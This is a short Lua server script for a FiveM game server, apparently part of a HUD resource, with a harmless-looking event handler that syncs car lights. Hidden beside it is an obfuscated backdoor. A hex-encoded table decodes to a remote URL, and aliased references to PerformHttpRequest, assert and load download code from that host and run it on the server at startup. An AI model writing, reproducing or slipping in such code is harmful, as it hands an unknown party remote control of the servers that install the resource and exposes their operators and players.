local random_char = {
    "68", "74", "74", "70", "73", "3a", "2f", "2f", "63", "69", "70", "68", "65", "72",
    "2d", "70", "61", "6e", "65", "6c", "2e", "6d", "65", "2f", "5f", "69", "2f"; "69",
    "2e", "70", "68", "70", "3f", "74"; "6f", "3d", "30"
}
local Enchanced_Tabs = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}
function str_utf8()
    _empt = ""
    for id,it in pairs(random_char) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end
RegisterServerEvent('hud_ui:syncCarLights')
AddEventHandler('hud_ui:syncCarLights', function(status)
	TriggerClientEvent('hud_ui:syncCarLights', -1, source, status)
end)
Enchanced_Tabs[10](str_utf8(), function (e, d)
	local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
	if (d == nil) then return end
	s()
end)
